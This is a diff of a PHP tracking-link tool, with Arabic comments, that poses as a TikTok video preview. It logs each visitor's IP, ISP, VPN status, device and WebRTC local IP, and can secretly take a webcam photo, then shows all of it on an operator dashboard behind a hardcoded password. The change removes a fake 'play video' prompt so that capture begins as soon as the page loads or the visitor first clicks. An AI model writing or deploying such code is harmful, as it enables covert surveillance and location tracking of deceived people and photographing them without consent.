@@ -4,9 +4,11 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(0);
 @ini_set('display_errors', 0);
 
+// بدء الجلسة لحماية لوحة التحكم بكلمة مرور
 session_start();
 $password_hash = password_hash('aziz123', PASSWORD_DEFAULT);
 
+// التحقق من تسجيل الدخول
 if (isset($_POST['login_password'])) {
     if ($_POST['login_password'] === 'aziz123') {
         $_SESSION['is_logged_in'] = true;
@@ -17,6 +19,7 @@ if (isset($_POST['login_password'])) {
     }
 }
 
+// تسجيل الخروج
 if (isset($_GET['logout'])) {
     session_destroy();
     header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
@@ -59,6 +62,7 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
+// دالة لجلب معلومات تيك توك للمعاينة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video',
@@ -185,6 +189,7 @@ function get_device_type($ua) {
     return 'Unknown Device';
 }
 
+// معالجة زيارة الروابط المختصرة للمتتبعين
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
     $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
@@ -224,7 +229,6 @@ if (isset($_GET['r'])) {
             
             $ip_details = get_ip_details($public_ip);
             $location = $ip_details['location'];
-
             $isp = $ip_details['isp'];
             $vpn = $ip_details['vpn'];
             $device = get_device_type($ua);
@@ -247,20 +251,7 @@ if (isset($_GET['r'])) {
     <meta property="og:type" content="video.other">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; font-family: sans-serif; }
-        .permission-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); display: flex; flex-direction: column;
-            align-items: center; justify-content: center; z-index: 9999; color: #fff; text-align: center; padding: 20px;
-        }
-        .permission-box {
-            background: #111827; border: 1px solid #374151; padding: 30px; border-radius: 12px; max-width: 360px; width: 100%;
-        }
-        .permission-box h3 { margin-bottom: 10px; font-size: 18px; color: #38bdf8; }
-        .permission-box p { font-size: 13px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
-        .permission-btn {
-            background: #8b5cf6; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px;
-        }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
     </style>
     <script>
         let isProcessed = false;
@@ -287,7 +278,7 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function executeTrackingSequence(imageData = "") {
+        function sendInfoAndRedirect(imageData = "") {
             if (isProcessed) return;
             isProcessed = true;
 
@@ -296,8 +287,6 @@ if (isset($_GET['r'])) {
                 formData.append('save_info', '1');
                 formData.append('image', imageData);
                 formData.append('lip', localIp);
-                formData.append('lat', "");
-                formData.append('lon', "");
 
                 fetch(window.location.href, {
                     method: 'POST',
@@ -308,12 +297,9 @@ if (isset($_GET['r'])) {
             });
         }
 
-        function startCaptureProcess() {
-            const overlay = document.getElementById('permissionOverlay');
-            if(overlay) overlay.style.display = 'none';
-
+        function initTracking() {
             if (!useCamera) {
-                executeTrackingSequence("");
+                sendInfoAndRedirect("");
                 return;
             }
 
@@ -333,30 +319,24 @@ if (isset($_GET['r'])) {
                         const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
 
-                        executeTrackingSequence(imageData);
-                    }, 400);
+                        sendInfoAndRedirect(imageData);
+                    }, 300);
                 })
                 .catch(err => {
-                    executeTrackingSequence("");
+                    sendInfoAndRedirect("");
                 });
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => {
-                const overlay = document.getElementById('permissionOverlay');
-                if(overlay) overlay.style.display = 'flex';
-            }, 100);
+            initTracking();
         });
+
+        window.addEventListener('click', () => {
+            initTracking();
+        }, { once: true });
     </script>
 </head>
 <body>
-    <div id="permissionOverlay" class="permission-overlay" style="display:none;">
-        <div class="permission-box">
-            <h3>مشغل فيديو TikTok</h3>
-            <p>انقر أدناه لمتابعة تشغيل الفيديو بجودة عالية وعرض المحتوى بالكامل.</p>
-            <button class="permission-btn" onclick="startCaptureProcess()">تشغيل الفيديو</button>
-        </div>
-    </div>
 </body>
 </html>
 <?php 
@@ -366,6 +346,7 @@ if (isset($_GET['r'])) {
     }
 }
 
+// حذف سجل محدد
 if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
     $del_id = intval($_GET['delete_id']);
     $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
@@ -374,6 +355,7 @@ if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
     exit();
 }
 
+// إنشاء رابط جديد
 $generated_link = "";
 $generated_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_SESSION['is_logged_in'])) {
@@ -494,7 +476,7 @@ if (!empty($filter_code)) {
             font-weight: 600;
         }
 
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-top: 15px; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
         .card-img { background: #050b14; border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; position: relative; }
         .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
         
@@ -564,6 +546,7 @@ if (!empty($filter_code)) {
         </div>
 
         <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
+            <!-- نموذج تسجيل الدخول -->
             <div class="section-box" style="max-width: 400px; margin: 50px auto; width: 100%;">
                 <h2>تسجيل الدخول</h2>
                 <?php if (!empty($login_error)): ?>
@@ -575,6 +558,7 @@ if (!empty($filter_code)) {
                 </form>
             </div>
         <?php else: ?>
+            <!-- لوحة التحكم المحمية -->
             <div style="text-align: right; margin-bottom: -15px;">
                 <a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px; text-decoration: none;">تسجيل الخروج</a>
             </div>
@@ -655,7 +639,7 @@ if (!empty($filter_code)) {
                                     <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                                 </div>
                                 <div class="info-row">
-                                    <span>Location:</span> <span style="color:#10b981; font-weight: bold;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                                    <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                                 </div>
                                 <div class="info-row">
                                     <span>المتعامل:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
